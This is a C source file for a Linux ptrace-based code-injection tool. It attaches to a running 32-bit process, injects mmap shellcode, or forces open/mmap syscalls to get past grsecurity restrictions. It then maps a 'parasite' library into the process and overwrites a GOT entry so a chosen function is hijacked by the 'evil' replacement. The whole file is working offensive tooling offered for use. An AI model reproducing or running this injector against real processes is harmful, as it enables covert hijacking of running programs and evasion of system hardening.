#include <ctype.h>
#include <dlfcn.h>
#include <elf.h>
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/ptrace.h>
#include <sys/user.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <unistd.h>

typedef unsigned char bool;
typedef unsigned long ulong_t;
typedef unsigned char uchar_t;

#define false 0;
#define true  1;

#define MAXBUF 256

#ifdef DEBUG_ENABLE
#define DEBUG(fmt, args...) printf("DEBUG: " fmt "\n", ##args)
#else
#define DEBUG 
#endif

#define ERROR(fmt, args...) fprintf(stderr, "ERROR (%s): " fmt "\n", __func__, ##args)

/* symbol relocation info */
struct sym {
	int count;
	char name[MAXBUF];
	int index;
	uint32_t offset;
};

struct sym_info {
	int count;
	struct sym syms[0];
};

/* options for the program */
struct opts {
	bool grsec;
	bool sysenter;
	// TODO: we should be able to figure this out from ELF header (ET_DYN vs ET_EXEC)
	bool et_dyn; // proc/pid/maps file differs for PIE binaries
	int pid;
	char * func;
	char * libname;
};

typedef enum seg_type {
	TYPE_TEXT = 0,
	TYPE_DATA = 1,
} seg_type_t;

struct segment {
	ulong_t base;
	ulong_t offset;
	ulong_t len;
}; 

// captures information about our parasite library
struct segments {
	struct segment segs[2];
};
	

static ulong_t original;
static ulong_t text_base;
static ulong_t data_base;

// includes shellcode that mmap()s our evil library
#include "shellcode.h"

// includes byte-based signatures of our evil function and
// the address we need to patch to transfer back to the 
// original (innocuous) function (our "transfer code")
#include "signatures.h"


/* copy size bytes from target memory */
static inline void
ptrace_cpy_from (ulong_t * dst,
				 ulong_t src,
				 size_t size,
				 int pid)
{
	int i;

    for (i = 0; i < (size+sizeof(ulong_t)-1)/sizeof(ulong_t); i++)
        dst[i] = ptrace(PTRACE_PEEKTEXT, pid, src + i*sizeof(ulong_t));
}


/* copy size bytes to target memory */
static inline void
ptrace_cpy_to (ulong_t dst,
			   ulong_t * src,
			   size_t size,
			   int pid)
{
	int i;
	for (i = 0; i < (size+sizeof(ulong_t)-1) / sizeof(ulong_t); i++) {
		errno = 0;
		long ret = ptrace(PTRACE_POKETEXT, pid, dst + (i*sizeof(ulong_t)), src[i]);
		if (ret == -1 && errno) {
			ERROR("Ptrace failed (%s)", strerror(errno));
			return;
		}
		
	}
}


// the transfer code gets us back (via function pointer usually)
// to the *original* function (the one we're overriding)
static void
inject_transfer_code (int pid, ulong_t target_addr, ulong_t newval)
{
	DEBUG("Injecting %lx at 0x%lx", newval, target_addr);
	ptrace(PTRACE_POKETEXT, pid, target_addr, newval);
}


/* bypasses grsec patch that prevents code injection into text */
static int 
grsec_mmap_library (int pid, 
					char * libname,
					bool static_sysenter, 
					ulong_t * evilbase, 
					struct segments * segs)
{
	struct  user_regs_struct reg;
	long eip, esp, string, offset, str,
		 eax, ebx, ecx, edx, orig_eax, data;
	long syscall_eip;
	int i, j = 0, ret, status, fd;
	char library_string[MAXBUF] = {0};
	char orig_ds[MAXBUF] = {0};
	char buf[MAXBUF] = {0};
	unsigned char tmp[8192];
	ulong_t sysenter = 0;

	snprintf(library_string, MAXBUF, "/lib/%s", libname);

	/* backup first part of data segment which will use for a string and some vars */
	ptrace_cpy_from((ulong_t*)orig_ds, data_base, strlen(library_string) + 32, pid);

	/* store our string for our evil lib there */
	ptrace_cpy_to(data_base, (ulong_t*)library_string, strlen(library_string), pid);

	/* verify we have the correct string */
	ptrace_cpy_from((ulong_t*)buf, data_base, strlen(library_string), pid);

	if (strncmp(buf, library_string, MAXBUF) == 0)
		DEBUG("Verified string is stored in DS: %s", buf);
	else {
		ERROR("String was not properly stored in DS: %s", buf);
		return -1;
	}

	// force the target to stop right before it performs a syscall
	// if it doesn't perform syscalls, we're toast
	ptrace(PTRACE_SYSCALL, pid, NULL, NULL);

	wait(NULL);

	ptrace(PTRACE_GETREGS, pid, NULL, &reg);

	eax = reg.eax;
	ebx = reg.ebx;
	ecx = reg.ecx;
	edx = reg.edx;
	eip = reg.eip;
	esp = reg.esp; 

	syscall_eip = reg.eip - 20;

	/*
	   sysenter should point to this instr sequence: 
		   push   %ecx
		   push   %edx
		   push   %ebp
		   mov    %esp, %ebp
		   sysenter 
	 */

	// We now verify the location of the sysenter instruction
	if (!static_sysenter) {// this gets sysenter dynamically if its randomized
	
		ptrace_cpy_from((ulong_t*)tmp, syscall_eip, 20, pid);
		for (i = 0; i < 20; i++) {
			// look for the instr signature of sysenter
			if (tmp[i] == 0x0f && tmp[i + 1] == 0x34)
				sysenter = syscall_eip + i;
		}
	} else {// this works only if sysenter isn't at a random location
		ptrace_cpy_from((ulong_t*)tmp, 0xffffe000, 8192, pid);
		for (i = 0; i < 8192; i++) {
			// look for the instr signature of sysenter
			if (tmp[i] == 0x0f && tmp[i+1] == 0x34)
				sysenter = 0xffffe000 + i;
		}
	}

	if (!sysenter) {
		ERROR("Unable to find sysenter\n");
		return -1;
	}

	// bump it back to capture the prologue
	sysenter -= 5;

	DEBUG("Sysenter found: 0x%lx", sysenter);   

	ptrace(PTRACE_DETACH, pid, NULL, NULL);
	wait(0);

	if (ptrace(PTRACE_ATTACH, pid, NULL, NULL)) {
		ERROR("Could not attach to process");
		exit(EXIT_FAILURE);
	}

	waitpid(pid, &status, WUNTRACED);

	// we force an open() of our library path
	reg.eax = SYS_open;
	reg.ebx = (long)data_base;
	reg.ecx = 0;  
	reg.eip = sysenter;

	ptrace(PTRACE_SETREGS, pid, NULL, &reg);
	ptrace(PTRACE_GETREGS, pid, NULL, &reg);

	// force the pseudo-syscall (by stepping through the syscall instr sequence)
	for (i = 0; i < 5; i++) {
		ptrace(PTRACE_SINGLESTEP, pid, NULL, NULL);
		wait(NULL);
		ptrace(PTRACE_GETREGS, pid, NULL, &reg);
		if (reg.eax != SYS_open)
			fd = reg.eax;
	}

	offset = (data_base + strlen(library_string)) + 8;

	reg.eip = sysenter;
	reg.eax = SYS_mmap;
	reg.ebx = offset;

	// we're setting up arguments now to mmap() 
	ptrace(PTRACE_POKETEXT, pid, offset, 0);       // 0
	ptrace(PTRACE_POKETEXT, pid, offset + 4,       // len of our library 
		   segs->segs[TYPE_TEXT].len + (PAGE_SIZE - (segs->segs[TYPE_TEXT].len & (PAGE_SIZE - 1))));               
	ptrace(PTRACE_POKETEXT, pid, offset + 8, 5);   // PROT_READ | PROT_EXEC
	ptrace(PTRACE_POKETEXT, pid, offset + 12, 2);  // MAP_SHARED
	ptrace(PTRACE_POKETEXT, pid, offset + 16, fd); // fd (we got this back from open)
	ptrace(PTRACE_POKETEXT, pid, offset + 20,      // offset
           segs->segs[TYPE_TEXT].offset & ~(PAGE_SIZE - 1));  

	ptrace(PTRACE_SETREGS, pid, NULL, &reg);
	ptrace(PTRACE_GETREGS, pid, NULL, &reg);    

	// force the pseudo-syscall (by stepping through the syscall instr sequence)
	for(i = 0; i < 5; i++) {
		ptrace(PTRACE_SINGLESTEP, pid, NULL, NULL);
		wait(NULL);
		ptrace(PTRACE_GETREGS, pid, NULL, &reg);
		// we should get back the address of our newly mmap()'d library
		if (reg.eax != SYS_mmap)
			*evilbase = reg.eax;
	}

	reg.eip = sysenter;
	reg.eax = SYS_mmap;
	reg.ebx = offset;

	// we mmap() the data segment as well rw- (we won't need this for our attack though)
	ptrace(PTRACE_POKETEXT, pid, offset, 0);       // 0
	ptrace(PTRACE_POKETEXT, pid, offset + 4, segs->segs[TYPE_DATA].len + (PAGE_SIZE - (segs->segs[TYPE_DATA].len & (PAGE_SIZE - 1))));
	ptrace(PTRACE_POKETEXT, pid, offset + 8, 3);   // PROT_READ | PROT_WRITE
	ptrace(PTRACE_POKETEXT, pid, offset + 12, 2);  // MAP_SHARED
	ptrace(PTRACE_POKETEXT, pid, offset + 16, fd); // fd
	ptrace(PTRACE_POKETEXT, pid, offset + 20, segs->segs[TYPE_DATA].offset & ~(PAGE_SIZE - 1));    

	ptrace(PTRACE_SETREGS, pid, NULL, &reg);
	ptrace(PTRACE_GETREGS, pid, NULL, &reg);

	// force the pseudo-syscall (by stepping through the syscall instr sequence)
	for (i = 0; i < 5; i++) {
		ptrace(PTRACE_SINGLESTEP, pid, NULL, NULL);
		wait(NULL);
	}

	DEBUG("Restoring data segment");

	ptrace_cpy_to(data_base, (ulong_t*)orig_ds, strlen(library_string) + 32, pid);

	reg.eip = eip;
	reg.eax = eax;
	reg.ebx = ebx;
	reg.ecx = ecx;
	reg.edx = edx; 
	reg.esp = esp;

	ptrace(PTRACE_SETREGS, pid, NULL, &reg);
	ptrace(PTRACE_DETACH, pid, NULL, NULL);

	return 0;
}


static void
dump_buf (uchar_t * buf, size_t size)
{
	int i;
    for (i = 0; i < size; i++) {
        if ((i % 20) == 0)
            printf("\n");
        printf("\\x%.2x", buf[i]);
    }
    printf("\n");
}


/* 
 * Injects shellcode to mmap() our library in
 * the target's .text segment. Newer systems
 * will not allow this. But we can get around it
 * by mucking with .data instead (see grsec version)
 */
static int 
mmap_library (int pid, ulong_t * evilbase)
{
	struct user_regs_struct reg;
	long eip, esp, string, offset,
         eax, ebx, ecx, edx;
	size_t shellcode_size = sizeof(mmap_shellcode);
	uchar_t saved_text[shellcode_size];
	uchar_t buf[shellcode_size];
    int i, j;

    ptrace(PTRACE_GETREGS, pid, NULL, &reg);

	eip = reg.eip;
	esp = reg.esp;
    eax = reg.eax;
    ebx = reg.ebx;
    ecx = reg.ecx;
    edx = reg.edx;

    offset = text_base;
    
    DEBUG("%%eip -> 0x%lx", eip);
    DEBUG("Injecting mmap_shellcode at 0x%lx", offset);
 
	// backup original code before we 
	// clobber it with shellcode
	ptrace_cpy_from((ulong_t*)saved_text, offset, shellcode_size, pid);
    
	DEBUG("Here is the saved instruction data:");
#ifdef DEBUG_ENABLE
	dump_buf(saved_text, shellcode_size);
#endif

	// actual code injection
	ptrace_cpy_to(offset, (ulong_t*)mmap_shellcode, shellcode_size, pid);
    
    DEBUG("Verifying shellcode was injected properly, does this look ok?");

	ptrace_cpy_from((ulong_t*)buf, offset, shellcode_size, pid);

	dump_buf(buf, shellcode_size);

    DEBUG("Setting %%eip to 0x%lx", offset);

	// we now invoke the mmap() shellcode
    reg.eip = offset + 2;

	ptrace(PTRACE_SETREGS, pid, NULL, &reg);
    ptrace(PTRACE_CONT, pid, NULL, NULL);
    
    wait(NULL);

    ptrace(PTRACE_GETREGS, pid, NULL, &reg);

    DEBUG("%%eip is now at 0x%lx, resetting it to 0x%lx", reg.eip, eip);
    DEBUG("Restoring original code");
    
	ptrace_cpy_to(offset, (ulong_t*)saved_text, shellcode_size, pid);

    /* get base addr of our mmap'd lib */
    *evilbase = reg.eax;
	
	DEBUG("Evilbase is %lx", reg.eax);
	DEBUG("EBX is %lx", reg.ebx);
	DEBUG("EDI is %lx", reg.edi);
	ptrace_cpy_from((ulong_t*)saved_text, reg.ebx, shellcode_size, pid);
	DEBUG("String there is %s", (char*)saved_text);
	
    
    reg.eip = eip;
    reg.eax = eax;
    reg.ebx = ebx;
    reg.ecx = ecx;
    reg.edx = edx;
    reg.esp = esp;

	ptrace(PTRACE_SETREGS, pid, NULL, &reg);
    
    if (ptrace(PTRACE_DETACH, pid, NULL, NULL) == -1) {
        ERROR("Could not detach from target");
        exit(EXIT_FAILURE);
    }

	return 0;
}


/* this parses the R_386_JUMP_SLOT relocation entries 
 * from our process 
 */
static struct sym_info * 
get_plt (uchar_t * mem) 
{
	Elf32_Ehdr *ehdr;
	Elf32_Shdr *shdr, *shdrp, *strtab;
	Elf32_Sym *syms, *symsp;
	Elf32_Rel *rel;

	char * symname = NULL;
	int i, j, k, symcount;

	struct sym_info * sinfo = NULL;

	ehdr = (Elf32_Ehdr*)mem;
	shdr = (Elf32_Shdr*)(mem + ehdr->e_shoff);

	shdrp = shdr;

	for (i = 0; i < ehdr->e_shnum; i++, shdrp++) {

		// we're looking for the dynamic symbol table here
		if (shdrp->sh_type == SHT_DYNSYM) {

			// section hdr index of associated string table
			strtab = &shdr[shdrp->sh_link];

			if ((symname = malloc(strtab->sh_size)) == NULL)
				return NULL;

			memcpy(symname, mem + strtab->sh_offset, strtab->sh_size);

			if ((syms = (Elf32_Sym *)malloc(shdrp->sh_size)) == NULL)
				return NULL;

			memcpy((Elf32_Sym*)syms, (Elf32_Sym*)(mem + shdrp->sh_offset), shdrp->sh_size);

			symsp = syms;

			symcount = shdrp->sh_size / sizeof(Elf32_Sym);

			sinfo = (struct sym_info*)malloc(sizeof(struct sym_info) + sizeof(struct sym)*symcount);

			if (!sinfo) {
				ERROR("Could not allocate symbol info");
				return NULL;
			}

			sinfo->count = symcount;

			for (j = 0; j < symcount; j++, symsp++) {
				strncpy(sinfo->syms[j].name, &symname[symsp->st_name], MAXBUF);
				sinfo->syms[j].index = j;
			}

			free(symname);
			free(syms);
			break;
		}
	}

	// associate relocation entires with symbols
	for (i = 0; i < ehdr->e_shnum; i++, shdr++) {
		if (shdr->sh_type == SHT_REL) {
			rel = (Elf32_Rel*)(mem + shdr->sh_offset);
			for (j = 0; j < shdr->sh_size; j += sizeof(Elf32_Rel), rel++) {
				for (k = 0; k < symcount; k++) {
					if (ELF32_R_SYM(rel->r_info) == sinfo->syms[k].index) 
						sinfo->syms[k].offset = rel->r_offset;
				}
			}
		}
	}

	return sinfo;
}


static size_t
get_evil_lib_size (int pid, char * libname) 
{
	FILE * fd = NULL;
	char maps[MAXBUF] = {0};
	char buf[MAXBUF];

	snprintf(maps, MAXBUF, "/proc/%d/maps", pid);

	fd = fopen(maps, "r");
	if (!fd) {
		ERROR("Could not open maps file");
		return 0;
	}

	while (fgets(buf, MAXBUF, fd)) {
		if (strstr(buf, libname)) {
			char * ptr = strtok(buf, " ");
			for (int i = 0; i < 4; i++)
				ptr = strtok(NULL, " ");
			fclose(fd);
			return atoi(ptr);
		}
	}
			
	fclose(fd);
	return 0;
}


static ulong_t
search_evil_lib (int pid, char * libname, ulong_t vaddr)
{
    uchar_t * buf;
    int i = 0;
	size_t libsz;
    ulong_t evilvaddr = 0;
	ulong_t ret = 0;

	libsz = get_evil_lib_size(pid, libname);
	
    if ((buf = malloc(libsz)) == NULL) {
        ERROR("Could not allocate lib buffer");
        exit(EXIT_FAILURE);
    }

	ptrace_cpy_from((ulong_t*)buf, vaddr, libsz, pid);
    DEBUG("Searching at library base [0x%lx] for evil function", vaddr);
    
	// TODO: hierarchical search better
    for (i = 0; i < libsz; i++) {
		if (memcmp(&buf[i], evilsig, strlen(evilsig)) == 0) {
			evilvaddr = (vaddr + i);
			break;
		}
    }

	if (!evilvaddr) {
		ERROR("Could not find evil function");
		goto out_err;
	}
    
    DEBUG("Parasite code ->");
#ifdef DEBUG_ENABLE
	dump_buf(buf, 50);
#endif

out_err:
    free(buf);
	return evilvaddr;
}


static bool 
evil_lib_present (char * lib, int pid)
{
	char meminfo[MAXBUF];
    char buf[MAXBUF];
	FILE * fd;

	memset(meminfo, 0, sizeof(meminfo));
	snprintf(meminfo, sizeof(meminfo), "/proc/%d/maps", pid);

	fd = fopen(meminfo, "r");

	if (!fd) {
		ERROR("Could not open map file");
		return true;
	}
    
    while (fgets(buf, MAXBUF, fd)) {
		if (strstr(buf, lib)) {
			fclose(fd);
			return true;
		}
	}

	fclose(fd);
    return false;
}


static Elf32_Addr
patch_got (struct opts * opt, struct sym_info * sinfo, ulong_t lib_base, ulong_t patch_val)
{
	Elf32_Addr ret = 0;
	Elf32_Addr got_offset;
	
	// overwrite GOT entry with addr of evilfunc (our replacement)
	for (int i = 0; i < sinfo->count; i++) {
		if (strcmp(sinfo->syms[i].name, opt->func) == 0) {

			DEBUG("Found string <%s> to patch", sinfo->syms[i].name);

			if (opt->et_dyn) {
				got_offset = (lib_base + (sinfo->syms[i].offset - text_base));
			} else {
				got_offset = sinfo->syms[i].offset;
			}

			original = (ulong_t)ptrace(PTRACE_PEEKTEXT, opt->pid, got_offset);
			ptrace(PTRACE_POKETEXT, opt->pid, got_offset, patch_val);
			ret = ptrace(PTRACE_PEEKTEXT, opt->pid, got_offset);
			break;
		}
	}
	return ret;
}


static void
usage (char ** argv)
{
	printf("\nUsage: %s -p <pid> -f <function> [opts]\n"
			"\t-p  (required) PID of target process\n"
			"\t-f  (required) Function name we're hijacking\n"
			"\t-l  (required) Parasite library's name\n"
			"\t-d  ET_DYN processes\n"
			"\t-g  bypass grsec binary flag restriction \n"
			"\t-s  Meant to be used as a secondary method of\n"
			"\t    finding sysenter with -g; if -g fails, then add -s\n\n"
			"Example 1: %s -p <pid> -f <function> -l <lib> -g\n"
			"Example 2: %s -p <pid> -f <function> -l <lib> -g -s\n\n", argv[0], argv[0], argv[0]);

	exit(EXIT_SUCCESS);
}



static void 
parse_args (int argc, char ** argv, struct opts * opt)
{
	int c;
	opterr = 0;

	opt->grsec    = false;
	opt->sysenter = false;
	opt->et_dyn   = false;
	opt->pid      = -1;
	opt->libname  = NULL;
	opt->func     = NULL;
	
	while ((c = getopt(argc, argv, "dgsp:f:l:")) != -1) {
		switch (c) {
			case 'd':
				opt->et_dyn = true;
				break;
			case 'g':
				opt->grsec = true;
				break;
			case 's':
				opt->sysenter = true;
				break;
			case 'p':
				opt->pid = (int)atol(optarg);
				break;
			case 'f':
				opt->func = optarg;
				break;
			case 'l':
				opt->libname = optarg;
				break;
			case '?':
				if (isprint(optopt))
					ERROR("Unknown option '-%c'", optopt);
				else 
					ERROR("Unknown option character '\\x%x", optopt);
				exit(EXIT_FAILURE);
			default:
				abort();
		}
	}

	if (opt->pid == -1) {
		printf("-p option is required\n");
		usage(argv);
	}

	if (opt->func == NULL) {
		printf("-f option is required\n");
		usage(argv);
	}

	if (opt->libname == NULL) {
		printf("-l option is required\n");
		usage(argv);
	}
}


static char * 
map_binary (int pid)
{
	char meminfo[MAXBUF] = {0};
	struct stat st;
	int fd;
	char * ret = NULL;

	snprintf(meminfo, sizeof(meminfo), "/proc/%d/exe", pid);

	if ((fd = open(meminfo, O_RDONLY)) == -1) {
		ERROR("Could not open binary");
		return MAP_FAILED;
	}

	if (fstat(fd, &st) < 0) {
		ERROR("Could not stat binary");
		return MAP_FAILED;
	}

	ret = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, fd, 0);

	close(fd);

	return ret;
}


static inline bool 
binary_is_pie (struct opts * opt)
{
	return opt->et_dyn;
}


static bool
good_elf (Elf32_Ehdr * ehdr, struct opts * opt)
{
	if (!(ehdr->e_ident[EI_MAG0] == ELFMAG0 &&
 		  ehdr->e_ident[EI_MAG1] == ELFMAG1 &&
		  ehdr->e_ident[EI_MAG2] == ELFMAG2 &&
		  ehdr->e_ident[EI_MAG3] == ELFMAG3)) {
		ERROR("Binary is not an ELF executable");
		return false;
	}

	if (ehdr->e_ident[EI_CLASS] != ELFCLASS32) {
		ERROR("Only 32-bit ELF executables are supported");
		return false;
	}


	if (!(ehdr->e_type == ET_EXEC || ehdr->e_type == ET_DYN)) {
		ERROR("Only executable binaries are supported");
		return false;
	}
	
	if (ehdr->e_type == ET_DYN && !opt->et_dyn) {
		ERROR("Target process is of type ET_DYN, but the '-d' option was not specified");
		return false;
	}

	return true;
}


static void
parse_headers (Elf32_Ehdr * ehdr, struct segments * segs)
{
	Elf32_Phdr * phdr = (Elf32_Phdr*)((char*)ehdr + ehdr->e_phoff);
	int i;

	for (i = 0; i < ehdr->e_phnum; i++, phdr++) {
		if (phdr->p_type == PT_LOAD) { 
			// .text
			if (phdr->p_flags == (PF_X | PF_R)) {
				segs->segs[TYPE_TEXT].base   = phdr->p_vaddr;
				text_base = phdr->p_vaddr;
				segs->segs[TYPE_TEXT].offset = phdr->p_offset;
				segs->segs[TYPE_TEXT].len    = phdr->p_filesz;
			}

			// .data
			if (phdr->p_flags == (PF_W | PF_R)) {
				segs->segs[TYPE_DATA].base   = phdr->p_vaddr;
				data_base = phdr->p_vaddr;
				segs->segs[TYPE_DATA].offset = phdr->p_offset;
				segs->segs[TYPE_DATA].len    = phdr->p_filesz;
			}
		}
	}
}


static int
inject_lib (struct opts * opt, ulong_t * evilbase, struct segments * segs)
{
	int status;

	DEBUG("Injecting evil lib");
	
	if (opt->grsec)
		grsec_mmap_library(opt->pid, opt->libname, opt->sysenter, evilbase, segs);
	else
		mmap_library(opt->pid, evilbase);

	if (ptrace(PTRACE_ATTACH, opt->pid, NULL, NULL)) {
		ERROR("Could not attach");
		return -1;
	}

	waitpid(opt->pid, &status, WUNTRACED);

	return 0;
}


static inline void
attach (int pid)
{
	int status;

	if (ptrace(PTRACE_ATTACH, pid, NULL, NULL)) {
		ERROR("Failed to attach to process");
		exit(EXIT_FAILURE);
	}
	waitpid(pid, &status, WUNTRACED);
}


int 
main (int argc, char **argv)
{
	char ps[7], *p;
	uchar_t * mem = NULL;
	Elf32_Ehdr *ehdr;
	Elf32_Addr ret;
	ulong_t evilfunc;
	ulong_t evilbase;
	struct sym_info * sinfo;

	struct opts opt;
	struct segments segs;

	unsigned char evil_code[MAXBUF];
	unsigned char initial_bytes[12];
	ulong_t injection_vaddr = 0;

	parse_args(argc, argv, &opt);

	mem = map_binary(opt.pid);
	if (mem == MAP_FAILED) {
		ERROR("Could not map binary");
		exit(EXIT_FAILURE);
	}

	ehdr = (Elf32_Ehdr *)mem;

	// make sure this is a valid ELF
	if (!good_elf(ehdr, &opt)) {
		ERROR("ELF verification failed");
		exit(EXIT_FAILURE);
	}

	parse_headers(ehdr, &segs);

	// attach to the running process
	attach(opt.pid);

	// get symbol relocation information for our target
	sinfo = get_plt(mem);
	
	if (!sinfo) {
		ERROR("Could not parse PLT information");
		exit(EXIT_FAILURE);
	}

	/* inject mmap shellcode into process to load lib */
	if (evil_lib_present(opt.libname, opt.pid)) {
		ERROR("Process %d already infected, %s is mmap'd already", opt.pid, opt.libname);
		goto out_err;
	} else {
		inject_lib(&opt, &evilbase, &segs);
	}

	if ((evilfunc = search_evil_lib(opt.pid, opt.libname, evilbase)) == 0) {
		ERROR("Could not locate evil function");
		goto out_err;
	}

	DEBUG("Evil function location: 0x%lx", evilfunc);
	DEBUG("Modifying GOT entry to replace <%s> with 0x%lx", opt.func, evilfunc);

	ret = patch_got(&opt, sinfo, evilbase, evilfunc);

	if (ret == evilfunc)
		DEBUG("Successfully modified GOT entry");
	else {
		ERROR("Failed to modify GOT entry");
		goto out_err;
	} 

	DEBUG("New GOT value: %x", ret);

	// get a copy of our replacement function 
	// and search for control transfer sequence 
	ptrace_cpy_from((ulong_t*)evil_code, evilfunc, MAXBUF, opt.pid);

	/* once located, patch it with the addr of the original function */
	for (int i = 0; i < MAXBUF; i++) {
		if (memcmp(&evil_code[i], tc, strlen(tc)) == 0) {
			DEBUG("Located transfer code. Patching with %lx", original);
			injection_vaddr = (evilfunc + i) + 3;
			break;
		}
	}

	if (!injection_vaddr) {
		ERROR("Could not locate transfer code within parasite");
		goto out_err;
	}

	// patch jmp code with addr to original function
	inject_transfer_code(opt.pid, injection_vaddr, original);

done:
	ptrace(PTRACE_DETACH, opt.pid, NULL, NULL);
	return 0;

out_err:
	ptrace(PTRACE_DETACH, opt.pid, NULL, NULL);
	return EXIT_FAILURE;
}
